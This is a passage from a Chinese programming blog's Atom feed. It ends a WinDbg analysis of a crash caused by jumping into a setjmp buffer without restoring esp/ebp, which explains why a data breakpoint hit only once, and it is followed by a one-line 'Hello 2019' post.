class="line">Test!foo+0x1a:</span><br><span class="line">00b010ba 6a00            push    0</span><br><span class="line"></span><br><span class="line">0:000&gt; ub eip L1</span><br><span class="line">Test!foo+0x13 [c:\users\test\source\repos\test\test\test.cpp @ 27]:</span><br><span class="line">00b010b3 c745b800000000  mov     dword ptr [ebp-48h],0</span><br><span class="line"></span><br><span class="line">$$ 继续执行，第一次命中 bar 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00eff7f0 ebx=00c6c000 ecx=00000000 edx=00eff7f0 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b01040 esp=00eff7e0 ebp=00eff834 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">Test!bar:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 传入的 value 参数的值为 0</span><br><span class="line">0:000&gt; dd esp L3</span><br><span class="line">00eff7e0  00b010f1 00eff7f0 00000000</span><br><span class="line"></span><br><span class="line">$$ 继续执行，第二次命中 bar 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00eff798 ebx=00b010c2 ecx=00000014 edx=00eff7f0 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b01040 esp=00eff7cc ebp=00eff7dc iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">Test!bar:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 传入的 value 参数的值为 0x20!!!</span><br><span class="line">0:000&gt; dd esp L3</span><br><span class="line">00eff7cc  00b010f1 00eff798 00000020</span><br></pre></td></tr></table></figure><p>的确，这里 <code>ba</code> 内存断点只命中了一次，但是第二次命中 <code>bar</code> 函数时，参数 <code>value</code> 的值却改变了，难道这是 WinDbg 的 Bug 吗？事实上并不是，而是 <code>bar</code> 函数中直接跳转到 <code>jmp_buf</code> 中的 <code>eip</code> 的写法是有问题的！</p><p>当从 <code>foo</code> 进入 <code>bar</code> 时，<code>bar</code> 函数也会建立栈帧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u Test!bar</span><br><span class="line">Test!bar [c:\users\test\source\repos\test\test\test.cpp @ 7]:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line">00b01041 8bec            mov     ebp,esp</span><br></pre></td></tr></table></figure><p>而之后在 <code>bar</code> 函数中又直接跳转到 <code>jmp_buf</code> 中的 <code>eip</code> ，此时 <code>esp</code> 和 <code>ebp</code> 寄存器的值没有被恢复，就直接回到了 <code>foo</code> 函数中。因为局部变量 <code>value</code> 是基于 <code>ebp</code> 进行定位的，而此时 <code>ebp</code> 的值已经变了，以至于 <code>foo</code> 再次调用 <code>bar</code> 时，<code>value</code> 不再是原来的 <code>value</code> ，而内存断点监控的仍然是原来存放 <code>value</code> 变量的地址（原有地址上的值也并未改变），因此自然不会再次命中，也无法监控到 <code>value</code> 的值的<strong><em>改变</em></strong> （改变只是由于 <code>ebp</code> 发生了变化从而读取到了栈上存储的其他值）。</p><p>同样，<code>bar</code> 函数的第一个参数 <code>env</code> 所存储的值也会因为 <code>foo</code> 函数中 <code>ebp</code> 的变化而变化，当传递一个非法的 <code>env</code> 给 <code>longjmp</code> 时，进程直接 Crash 掉了。</p><p>本小节给出的示例程序，完全是 <code>setjmp</code> 和 <code>longjmp</code> 的一种错误用法，这两个函数应该配套使用，而不应该在中间某个地方直接通过 <code>jmp</code> 或者 <code>call</code> 来跳转到 <code>setjmp</code> 之后的位置。这里给出的示例程序是实际调试过程中遇到的问题的一个简化模型，仅供调试学习之用，读者切勿模仿这里的错误写法。</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><p>本文通过分析一个 Crash 学习了 <code>setjmp</code> 和 <code>longjmp</code> 的基本用法，并分析清楚了造成 Crash 的根本原因。</p><p>除了异常处理之外， <code>setjmp</code> 和 <code>longjmp</code> 还有一些其他场合的应用，比如实现 <a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E7%A8%8B#%E7%94%A8C%E7%9A%84%E5%AE%9E%E7%8E%B0" target="_blank" rel="noopener">协程</a> 等，具体可以参考 <a href="https://stackoverflow.com/questions/14685406/practical-usage-of-setjmp-and-longjmp-in-c" target="_blank" rel="noopener">StackOverflow</a> 上的提问。</p><p>最后，基于 <code>setjmp</code> 和 <code>longjmp</code> 还可以实现一定程度的代码混淆（反分析、反调试），这个问题留给读者自行思考和实践。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-问题描述&quot;&gt;&lt;a href=&quot;#0x01-问题描述&quot; class=&quot;headerlink&quot; title=&quot;0x01. 问题描述&quot;&gt;&lt;/a&gt;0x01. 问题描述&lt;/h2&gt;&lt;p&gt;周末在测试一个程序时，发现其莫名其妙的 Crash 在了一个系统自带 DLL 的某个函数里面，而且很难直观地看出来 Crash 的原因，分析之后发现是不当使用 C 语言 &lt;code&gt;setjmp&lt;/code&gt; 和 &lt;code&gt;longjmp&lt;/code&gt; 两个函数导致的。那么这和文章标题有什么联系呢？笔者在分析的过程中使用了 WinDbg 的内存断点（ Processor Breakpoint / Data Breakpoint ）来跟踪一个栈变量的读写操作，理论上这个断点会多次命中，但实际上只命中了一次，而这个现象正是由于不当使用 &lt;code&gt;setjmp&lt;/code&gt; 和 &lt;code&gt;longjmp&lt;/code&gt; 导致 &lt;code&gt;esp&lt;/code&gt; 和 &lt;code&gt;ebp&lt;/code&gt; 寄存器的值的非预期改变所导致的。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="WinDbg" scheme="http://programlife.net/tags/WinDbg/"/>
    
      <category term="内存断点" scheme="http://programlife.net/tags/%E5%86%85%E5%AD%98%E6%96%AD%E7%82%B9/"/>
    
      <category term="setjmp" scheme="http://programlife.net/tags/setjmp/"/>
    
      <category term="longjmp" scheme="http://programlife.net/tags/longjmp/"/>
    
  </entry>
  
  <entry>
    <title>Hello 2019</title>
    <link href="http://programlife.net/2019/01/01/hello-2019/"/>
    <id>http://programlife.net/2019/01/01/hello-2019/</id>
    <published>2019-01-01T15:12:44.000Z</published>
    <updated>2019-01-01T15:34:39.040Z</updated>
    
    <content type="html"><![CDATA[<p>May you always have beginner’s mind.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;May you always have beginner’s mind.&lt;/p&gt;

      
    
    </summary>
    
      <category term="Default" scheme="http://programlife.net/categories/Default/"/>
    
    
      <category term="New Year" scheme="http://programlife.net/tags/New-Year/"/>
    
  </entry>
  
</feed>
